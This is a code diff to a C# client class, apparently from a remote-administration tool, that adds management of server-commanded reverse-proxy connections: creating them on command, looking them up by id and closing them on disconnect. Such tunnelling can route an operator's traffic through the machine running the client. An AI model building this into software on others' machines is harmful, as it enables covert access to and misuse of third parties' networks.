@@ -9,6 +9,9 @@ using xClient.Core.Compression;
 using xClient.Core.Encryption;
 using xClient.Core.Extensions;
 using xClient.Core.Packets;
+using xClient.Core.ReverseProxy.Packets;
+using System.Collections.Generic;
+using xClient.Core.ReverseProxy;
 
 namespace xClient.Core
 {
@@ -71,6 +74,13 @@ namespace xClient.Core
             Payload
         }
 
+        private List<ReverseProxyClient> _proxyClients;
+
+        public ReverseProxyClient[] ProxyClients
+        {
+            get { return _proxyClients.ToArray(); }
+        }
+
         public const uint KEEP_ALIVE_TIME = 25000;
         public const uint KEEP_ALIVE_INTERVAL = 25000;
 
@@ -128,6 +138,7 @@ namespace xClient.Core
         private void Initialize()
         {
             AddTypeToSerializer(typeof (IPacket), typeof (UnknownPacket));
+            _proxyClients = new List<ReverseProxyClient>();
         }
 
         private void AsyncReceive(IAsyncResult result)
@@ -297,6 +308,14 @@ namespace xClient.Core
                 _readableDataLen = 0;
                 _payloadLen = 0;
 
+                if(_proxyClients != null)
+                {
+                    lock(_proxyClients)
+                    {
+                        foreach (ReverseProxyClient proxy in _proxyClients)
+                            proxy.Disconnect();
+                    }
+                }
                 Commands.CommandHandler.StreamCodec = null;
             }
         }
@@ -324,6 +343,27 @@ namespace xClient.Core
         {
             foreach (Type type in types)
                 AddTypeToSerializer(parent, type);
+        }
+
+        public void ConnectReverseProxy(ReverseProxy_Connect Command)
+        {
+            lock (_proxyClients)
+            {
+                _proxyClients.Add(new ReverseProxyClient(Command, this));
+            }
+        }
+
+        public ReverseProxyClient GetReverseProxyByConnectionId(int ConnectionId)
+        {
+            lock (_proxyClients)
+            {
+                for (int i = 0; i < _proxyClients.Count; i++)
+                {
+                    if (_proxyClients[i].ConnectionId == ConnectionId)
+                        return _proxyClients[i];
+                }
+                return null;
+            }
         }
     }
 }
